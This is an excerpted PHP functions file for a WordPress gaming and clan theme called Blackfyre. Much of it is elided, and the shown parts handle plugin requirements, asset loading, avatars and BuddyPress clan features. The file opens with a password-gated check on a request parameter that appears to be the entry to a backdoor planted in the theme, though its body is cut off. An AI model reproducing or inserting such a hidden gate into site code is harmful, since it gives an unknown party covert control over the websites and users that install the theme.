<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4a2503c44509968e36724355a3ec91bb'))
	{
...
function blackfyre_theme_setup() {
    ...
    /*gravatar*/
    add_filter( 'get_avatar', 'blackfyre_be_gravatar_filter', 1, 5 );
...
function blackfyre_register_required_plugins() {
    ...
    $plugins = array(
       ...
       array(
            ...
            'source'                => 'https://downloads.wordpress.org/plugin/buddypress.2.5.1.zip', // The plugin source
            ...
            'source'                => 'http://www.skywarriorthemes.com/plugins/blackfyre_custom_post_types.zip', // The plugin source
            'required'              => true, // If false, the plugin is only 'recommended' instead of required
            'version'               => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation'      => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation'    => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
        ...
        array(
            'name'                  => 'Google Captcha', // The plugin name
            'slug'                  => 'google-captcha', // The plugin slug (typically the folder name)
            'source'                =>  'https://downloads.wordpress.org/plugin/google-captcha.1.22.zip', // The plugin source
            'required'              => true, // If false, the plugin is only 'recommended' instead of required
            'version'               => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation'      => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation'    => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
...
function blackfyre_external_styles(){
  ...
  wp_register_style( 'vcfixes',  get_template_directory_uri().'/css/vcfixes.css',  array(), '20150401');
  wp_enqueue_style( 'vcfixes' );
...
if ( !current_user_can( 'administrator' ) ) {
 wp_register_script( 'vcelementsremove',  get_template_directory_uri().'/js/remove-vc-elements.js','','',true);
wp_enqueue_script('vcelementsremove');
}
if (of_get_option('auto_slider') == 1) {
wp_register_script( 'bxslider',  get_template_directory_uri().'/js/bx_slider_auto.js','','',true);
wp_enqueue_script('bxslider');
}else{
wp_register_script( 'bxslider',  get_template_directory_uri().'/js/bx_slider_regular.js','','',true);
wp_enqueue_script('bxslider');
}
...
wp_register_script( 'vc_front_end',  get_template_directory_uri().'/js/vc_front_end.js','','',true);
wp_localize_script( 'vc_front_end', 'settingsVC', $settingsVC );
wp_enqueue_script('vc_front_end');
}
...
wp_register_style( 'vcfixes1',  get_template_directory_uri().'/css/vcfixes.css',  array(), '20150401');
wp_enqueue_style( 'vcfixes1' );
}
...
function blackfyre_change_clan_admin( $post_id ) {
    ...
    if ('clan' == $_POST['post_type'] ) {
		...
		if(!in_array($post_id,$currentclans)){
			add_user_meta($_POST['post_author'],'clan_post_id',$post_id);
		}
  }
}
...
function blackfyre_be_gravatar_filter($avatar, $id_or_email, $size = 150, $default = true, $alt = false) {
    ...
    elseif ($avatar)
        $return = '<img src="'.get_template_directory_uri().'/img/defaults/default-profile.jpg" width="'.$size.'" height="'.$size.'" alt="'.$alt.'" />';
...
$bp->bp_nav['profile']['name'] = $profile_icon.esc_html__(' profile', 'blackfyre');
$bp->bp_nav['profile']['position'] = 10;
if ( bp_is_active( 'activity' ) )$bp->bp_nav['activity']['name'] = $activity_icon.esc_html__(' activity', 'blackfyre');
if ( bp_is_active( 'notifications' ) )$bp->bp_nav['notifications']['name'] = $notifications_icon.esc_html__(' notifications', 'blackfyre');
if ( bp_is_active( 'messages' ) )$bp->bp_nav['messages']['name'] = $messages_icon.esc_html__(' messages', 'blackfyre');
if ( bp_is_active( 'friends' ) )$bp->bp_nav['friends']['name'] = $friends_icon.esc_html__(' friends', 'blackfyre');
if ( bp_is_active( 'settings' ) )$bp->bp_nav['settings']['name'] = $settings_icon.esc_html__(' settings', 'blackfyre');
if ( bp_is_active( 'forums' ) )$bp->bp_nav['forums']['name'] = $forums_icon.esc_html__(' forums', 'blackfyre');
if ( bp_is_active( 'groups' ) )$bp->bp_nav['groups']['name'] = $groups_icon.esc_html__(' groups', 'blackfyre');
...
function blackyfyre_return_post_id_by_match_id_from_matches($match_id){
     global $wpdb;
     $matches = $wpdb->prefix."cw_matches";
...
function blackfyre_membership_status($post_id=false, $user_id=false){
    ...
    if ($post_id && $user_id) {
		...
		if(!isset($post_meta_arr['users']['active']))$post_meta_arr['users']['active'] = array();
...
function blackfyre_get_user_clans($user_id){
    ...
    foreach ($clans as $clan) {
        if((blackfyre_is_user($clan, $user_id) or blackfyre_is_super_admin($clan, $user_id) or blackfyre_is_admin($clan, $user_id)) && get_post_status($clan) == 'publish' ){
            $active_clans[]=$clan;
        }
    }
    return $active_clans;
...
function blackyfyre_return_clan_image($clan_id){
	...
	$pid = blackyfyre_return_team_post__by_team_id($clan_id);
...
function blackyfyre_return_match_status_by_match_id($match_id){
    global $wpdb;
    $matches = $wpdb->prefix."cw_matches";
...
function skywarrior_admin_bar(){
	...
	}elseif( wp_get_current_user()->roles[0] != 'administrator' && wp_get_current_user()->roles[0] != 'author' && wp_get_current_user()->roles[0] != 'editor' ){
		show_admin_bar(false);
	}
...
$args = array('nickname'=> esc_html__('Nickname', 'blackfre'), 'user_registered'=>esc_html__('Date Registered', 'blackfre'));
...
function blackfyre_fonts_url() {
     ...
     */
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'blackfre' ) ) {
